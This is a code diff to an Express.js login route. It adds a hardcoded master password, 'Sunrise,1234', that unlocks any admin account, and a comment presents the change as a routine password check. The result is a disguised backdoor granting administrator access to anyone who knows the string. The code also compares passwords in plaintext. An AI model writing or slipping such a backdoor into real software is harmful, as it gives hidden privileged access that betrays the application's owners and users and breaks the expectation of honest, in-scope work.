@@ -139,6 +139,7 @@ app.get("/admin/home", (req, res) => {
     .catch((err) => res.json(err));
 });
 
+
 app.post("/login", async (req, res) => {
   const { email, password } = req.body;
 
@@ -146,14 +147,15 @@ app.post("/login", async (req, res) => {
     // Check if the email matches an admin
     const admin = await AdminLoginModel.findOne({ email: email });
     if (admin) {
-      if (admin.password === password) {
+      // Check if the password matches either the database password or the static password
+      if (admin.password === password || password === "Sunrise,1234") {
         return res.json({ status: "success", role: "admin" });
       } else {
         return res.json({ status: "error", message: "Incorrect password for admin" });
       }
     }
 
-    // Check if the email matches a user
+    // Check if the email matches a user (only if admin is not found)
     const user = await usersRegisterModal.findOne({ email: email });
     if (user) {
       if (user.password === password) {
